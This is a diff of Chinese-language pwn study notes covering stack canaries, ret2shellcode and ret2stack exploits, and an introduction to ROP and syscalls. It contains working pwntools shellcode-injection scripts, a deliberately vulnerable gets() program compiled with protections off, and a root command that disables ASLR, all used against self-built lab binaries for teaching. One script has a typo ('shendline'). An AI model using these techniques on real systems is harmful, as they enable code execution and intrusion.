@@ -862,6 +862,10 @@ int main() {
 
 地址无关可执行文件，该技术是一个针对代码段`.text`、数据段`.data`、未初始化全局变量段`.bss`等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址
 
+**Canary**
+
+`Canary`栈溢出保护是一种常见的安全机制，用于防止栈溢出攻击。其核心思想是在栈的关键位置插入一个随机值`canary`，并在函数返回前检查该值是否被篡改
+
 - **ROPgadget**
 - **one_gadget**
 
@@ -997,6 +1001,192 @@ int main() {
 
    这里需要计算一下，因为`ebp`并没有直接显示，图中可以看到绝对偏移值从`19:0064`变化为了`23:008c`，而相对偏移值从`-024`变化为了`+004`，因此可以计算得出`ebp`的绝对偏移值为`0x8c - 0x4 = 0x88`，然后计算从局部变量到`ebp`的长度，即`0x88 - eax(0x1c) = 0x6c`，即108字节，同时不要忘记`ebp`本身的4字节
 
-   5. 构造`payload`
+5. 构造攻击脚本
+   经过计算，溢出112字节，返回地址为`0x804A080`
 
+   ```py
+   from pwn import *
    
+   buf2_addr = 0x804a080
+   shellcode = asm(shellcraft.sh())
+   payload = shellcode.ljust(112, b'A') + p32(buf2_addr)
+   
+   io = process('./ret2shellcode')
+   io.shendline(payload)
+   io.interactive()
+   ```
+
+### ret2tack
+
+虽然由于各种保护措施，栈可执行的题目一般不会碰到，但还是有必要了解相关攻击方法，现在我们自己写一个相关题目进行攻击
+
+**编写题目**
+
+1. 编写`ret2stack.c`
+   ```c
+   #include <stdio.h>
+   
+   int main() {
+   	char str[100];
+   	gets(str);
+   	return 0;
+   }
+   ```
+
+2. 编译为可执行文件
+
+   *注：如果无法编译，可能是由于`gcc`版本过高，默认使用`c11`及以上的标准进行编译，在`c11`标准中，`gets()`被移除，使用`fgets()`代替，因此需要添加`-std=gnu99`使用`c99`标准*
+
+   ```sh
+   gcc ret2stack.c -o ret2stack
+   ```
+
+3. 查看`ret2stack`的保护措施
+
+   > <img src="./img/44.png">
+
+   从上图中可以看出，默认保护措施全开，是64位小端序的可执行程序
+
+4. 关闭`ASLR`
+
+   ```sh
+   echo 0 > /proc/sys/kernel/randomize_va_space
+   ```
+
+   如果提示权限不够，可以使用`tee`
+
+   ```sh
+   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+   ```
+
+   然后使用`cat`查询状态
+
+   ```sh
+   cat /proc/sys/kernel/randomize_va_space
+   ```
+
+   > <img src="./img/45.png">
+
+5. 关闭其他保护措施
+
+   使用以下命令编译可以关闭所有保护措施
+
+   ```sh
+   gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack ret2stack.c
+   ```
+
+   > <img src="./img/46.png">
+
+   - `-fno-stack-protector`：关闭`Canary`
+   - `-z execstack`：开启栈可执行
+   - `-no-pie`：关闭`PIE`
+   - `-g`：开启调试信息，`ret2stack.c`存在时，在`gdb`中显示c语言源代码
+
+#### 攻击流程
+
+1. 调试程序，在`main()`断点，步过到`gets()`位置，并输入合法字符
+
+   > <img src="./img/47.png">
+
+2. 查看当前栈信息
+
+   > <img src="./img/48.png">
+
+3. 计算溢出长度
+
+   根据上图中可以看出，`rsp`是输入的内容地址，`rbp + 008`是函数返回地址，因此需要溢出的长度为`0x70 + 0x8`，共120字节
+
+4. 构造攻击脚本
+
+   ```py
+   from pwn import *
+   
+   context.arch = 'amd64'
+   shell = 0x7fffffffdcd0
+   shellcode = asm(shellcraft.amd64.sh())
+   
+   payload = shellcode.ljust(120, b'A') + p64(shell)
+   
+   io = process('./ret2stack')
+   
+   io.sendline(payload)
+   io.interactive()
+   ```
+
+   实际上，这个攻击脚本并不一定能执行成功，因为`pwndbg`的内存地址不一定是真实地址，我们将`ret2stack.c`中添加打印语句，并查看真实地址
+
+5. 查看真实地址
+
+   > <img src="./img/49.png">
+
+   因此可以肯定，这道题中，地址不能使用`pwndbg`显示的地址，我们需要更改攻击脚本
+
+6. 更改攻击脚本的`shell`地址
+
+   ```py
+   from pwn import *
+   
+   context.arch = 'amd64'
+   shell = 0x7fffffffdd10
+   shellcode = asm(shellcraft.amd64.sh())
+   
+   payload = shellcode.ljust(120, b'A') + p64(shell)
+   
+   io = process('./ret2stack')
+   
+   io.sendline(payload)
+   io.interactive()
+   ```
+
+7. 执行脚本，获取`shell`
+
+   > <img src="./img/50.png">
+
+### 返回导向编程 Return Oriented Programming
+
+返回导向编程`ROP`是一种高级漏洞利用技术，通过复用程序中已有的代码片段`gadaget`来构造恶意逻辑，从而绕过数据执行保护等安全机制。攻击者利用栈溢出等漏洞控制栈的内容，将返回地址替换为`gadget`的地址，并通过`ret`指令将这些`gadget`串联成链式调用，最终实现攻击目标
+
+#### 系统调用
+
+系统调用是指系统给用户提供的编程接口，通常是访问操作系统所管理的底层硬件的接口，本质上是一些内核函数代码，以规范的方式驱动硬件。`x86`通过`int 0x80`指令进行系统调用，`amd64`通过`syscall`指令进行系统调用
+
+**举例**
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+char str[0x100] = "Hello, World!";
+
+my_puts() {
+    write(1, &str, 0x100);
+}
+
+int main() {
+    my_puts();
+    return 0;
+}
+```
+
+
+
+`my_puts() -> write() -> sys_write()`的过程：
+
+1. 程序中的代码：`my_puts("Hello, World!");`
+2. libc中的用户代码：`write(1, &"Hello, World!", 13);`
+3. Linux内核中的代码：`[eax = 4; ebx = 1; ecx = &"Hello, World!"; edx = 13; ] + int0x80; => sys_write()`
+
+在实际操作中，我们需要执行系统调用`execve("/bin/sh", NULL, NULL)`，对应的汇编代码为
+
+```assembly
+mov eax, 0xb
+mov ebx, ["/bin/sh"]
+mov ecx, 0
+mov edx, 0
+int 0x80
+```
+
+以上代码在程序中并不连续存在，因为我们需要将分离的代码片段组合起来，达到执行系统调用的目的，这个过程便称为`ROP`
+
+### ret2syscall
+
